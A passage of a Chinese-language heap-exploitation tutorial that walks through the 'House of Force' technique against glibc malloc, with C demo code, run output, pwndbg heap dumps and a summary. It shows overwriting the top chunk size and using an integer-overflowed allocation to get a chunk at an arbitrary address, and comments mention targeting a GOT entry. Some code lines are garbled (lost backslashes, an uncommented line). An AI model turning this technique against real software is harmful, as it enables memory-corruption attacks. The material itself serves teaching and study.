            fprintf(stderr, "Real size (aligned and all that jazz) of our allocated chunk is %ld.n", real_size + sizeof(long)*2);
            //现在假设我们有一个漏洞可以覆盖top chunk的大小
            fprintf(stderr, "nNow let's emulate a vulnerability that can overwrite the header of the Top Chunkn");
            //----- VULNERABILITY ----            intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));
            fprintf(stderr, "nThe top chunk starts at %pn", ptr_top);
            //用一个超大的值来覆盖top chunk以让我们可以确保malloc永远不会调用mmap来申请空间
            fprintf(stderr, "nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.n");
            fprintf(stderr, "Old size of top chunk %#llxn", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
            *(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
            fprintf(stderr, "New size of top chunk %#llxn", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
            //------------------------    
            //现在我们的top chunk的size巨大非凡,我们可以随意申请内存而不会调用mmap
            fprintf(stderr, "nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.n"
            //下面,我们将通过整数溢出分配一个直达我们所需区域的,之后就可以在我们所需区域处分配一个chunk出来
               "Next, we will allocate a chunk that will get us right up against the desired region (with an integern"
               "overflow) and will then be able to allocate a chunk right over the desired region.n");
            /*
            我们所需的size是这么计算的:
            nb是我们要求的size+元数据
             * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
             * new_top = old_top + nb
             * nb = new_top - old_top
             * req + 2sizeof(long) = new_top - old_top
             * req = new_top - old_top - 2sizeof(long)
             * req = dest - 2sizeof(long) - old_top - 2sizeof(long)
             * req = dest - old_top - 4*sizeof(long)
             */
            unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
            fprintf(stderr, "nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,n"
               "we will malloc %#lx bytes.n", bss_var, ptr_top, evil_size);
            void *new_ptr = malloc(evil_size);
            按预期,新的指针和旧的top chuk在同一位置
            fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %pn", new_ptr - sizeof(long)*2);
            void* ctr_chunk = malloc(100);
            //现在,我们覆写的下一个chunk将指向我们的目标buffer
            fprintf(stderr, "nNow, the next chunk we overwrite will point at our target buffer.n");
            fprintf(stderr, "malloc(100) => %p!n", ctr_chunk);
            //现在,我们终于可以覆写这个值啦!
            fprintf(stderr, "Now, we can finally overwrite that value:n");
            fprintf(stderr, "... old string: %sn", bss_var);
            fprintf(stderr, "... doing strcpy overwrite with "YEAH!!!"...n");
            strcpy(ctr_chunk, "YEAH!!!");
            fprintf(stderr, "... new string: %sn", bss_var);
            //一些进一步的总结
            // some further discussion:
            //这个被控制的malloc将会在参数为ebil_size=malloc_got_address-8-p2_gussed时被调用
            //fprintf(stderr, "This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessednn");
            //这个是因为main_arena->top指针被设为了 av->top + malloc_size,并且我们想要将这个地址设置为malloc_got_address - 8的地址
            //fprintf(stderr, "This because the main_arena->top pointer is setted to current av->top + malloc_size "
            //      "and we nwant to set this result to the address of malloc_got_address-8nn");
            //为了做这件事,我们让 malloc_got_address - 8= p2_gussed+evil_size
            //fprintf(stderr, "In order to do this we have malloc_got_address-8 = p2_guessed + evil_sizenn");
            //av->top在分配了这个大的malloc了之后将被设置为malloc_got_address -8
            //fprintf(stderr, "The av->top after this big malloc will be setted in this way to malloc_got_address-8nn");
            //再调用一次新的malloc的时候将返回av->top+8并且返回一个在(malloc_got_address-8)+8=malloc_got_address的chunk
            //fprintf(stderr, "After that a new call to malloc will return av->top+8 ( +8 bytes for the header ),"
            //      "nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_addressnn");
            //fprintf(stderr, "The large chunk with evil_size has been allocated here 0x%08xn",p2);
            //fprintf(stderr, "The main_arena value av->top has been setted to malloc_got_address-8=0x%08xn",malloc_got_address);
            //最后一次分配将会通过其余的代码提供服务并返回之前被注入的av->top +8
            //fprintf(stderr, "This last malloc will be served from the remainder code and will return the av->top+8 injected beforen");
    }
###  运行结果
    Welcome to the House of Force
    The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.
    The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.
    In the end, we will use this to overwrite a variable at 0x602060.
    Its current value is: This is a string that we want to overwrite.
    Let's allocate the first chunk, taking space from the wilderness.
    The chunk of 256 bytes has been allocated at 0x18b8000.
    Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.
    Real size (aligned and all that jazz) of our allocated chunk is 280.
    Now let's emulate a vulnerability that can overwrite the header of the Top Chunk
    The top chunk starts at 0x18b8110
    Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.
    Old size of top chunk 0x20ef1
    New size of top chunk 0xffffffffffffffff
    The size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.
    Next, we will allocate a chunk that will get us right up against the desired region (with an integer
    overflow) and will then be able to allocate a chunk right over the desired region.
    The value we want to write to at 0x602060, and the top chunk is at 0x18b8110, so accounting for the header size,
    we will malloc 0xfffffffffed49f30 bytes.
    As expected, the new pointer is at the same place as the old top chunk: 0x18b8110
    Now, the next chunk we overwrite will point at our target buffer.
    malloc(100) => 0x602060!
    Now, we can finally overwrite that value:
    ... old string: This is a string that we want to overwrite.
    ... doing strcpy overwrite with "YEAH!!!"...
    ... new string: YEAH!!!
###  调试
因为较为简单,只下了几个断点
       35   intptr_t *p1 = malloc(256);
     ► 36   fprintf(stderr, "The chunk of 256 bytes has been allocated at %p.n", p1 - 2);
       50   *(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
     ► 51   fprintf(stderr, "New size of top chunk %#llxn", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
       67   unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
     ► 68   fprintf(stderr, "nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,n"
       70   void *new_ptr = malloc(evil_size);
     ► 71   fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %pn", new_ptr - sizeof(long)*2);
       73   void* ctr_chunk = malloc(100);
     ► 74   fprintf(stderr, "nNow, the next chunk we overwrite will point at our target buffer.n");
首先我们申请chunk p1(256),此时
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603110 PREV_INUSE {
      prev_size = 0,
      size = 134897,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
可以看到我们的top chunk起始地址为0x63110而size为134897
之后我们将top chunk的size设为-1,也就是0xffffffffffffffff
    pwndbg> x/10gx 0x603110
    0x603110:       0x0000000000000000      0xffffffffffffffff
    0x603120:       0x0000000000000000      0x0000000000000000
    0x603130:       0x0000000000000000      0x0000000000000000
    0x603140:       0x0000000000000000      0x0000000000000000
    0x603150:       0x0000000000000000      0x0000000000000000
此时因为top chunk 的size巨大,因此无论我们申请多少的空间,他都不会再调用mmap了
现在我们计算一下evil_size的大小
evil_size=bss_var-0x20-ptr_top
    pwndbg> p/x evil_size
    $7 = 0xffffffffffffef30
之后申请一个evil_size大小的chunk
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603110 PREV_INUSE {
      prev_size = 0,
      size = 18446744073709547329,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x602050 PREV_INUSE {
      prev_size = 0,
      size = 4281,
      fd = 0x2073692073696854,
      bk = 0x676e697274732061,
      fd_nextsize = 0x6577207461687420,
      bk_nextsize = 0x6f7420746e617720
    }
    0x603108 {
      prev_size = 0,
      size = 0,
      fd = 0xffffffffffffef41,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
现在我们新申请的chunk是从之前的top chunk起始的
此时如果我们再申请一个chunk就可以拿到我们想要申请的地址了
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603110 PREV_INUSE {
      prev_size = 0,
      size = 18446744073709547329,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x602050 FASTBIN {
      prev_size = 0,
      size = 113,
      fd = 0x2073692073696854,
      bk = 0x676e697274732061,
      fd_nextsize = 0x6577207461687420,
      bk_nextsize = 0x6f7420746e617720
    }
    0x6020c0 PREV_INUSE {
      prev_size = 0,
      size = 4169,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603108 {
      prev_size = 0,
      size = 0,
      fd = 0xffffffffffffef41,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
## 总结
程序首先建立了一个全局变量bss_var,也就是我们需要攻击的地方
随后分配了chunk p1(256),现在我们的top chunk的size是一个比较小的值
因此我们假设有一个漏洞可以覆写top chunk的size,我们通过写入-1来使size变为一个巨大的数(0xffffffffffffffff)
此时无论我们再申请多大的空间,ptmalloc都不会再向系统申请调用mmap了(当然..如果把0xfffffffffffffff的空间都用完了还是会申请的
现在我们计算出了evil_size所需的值,也就是
evil_size=(bss_var-16)-(ptr_top)-16
此时我们先申请一个大小为evil_size的chunk,此时新指针和旧的top chunk在同一位置,而size正好是旧top
chunk到我们bss_var的差值
此时我们再申请一块chunk就可以获得我们想控制的var_bss了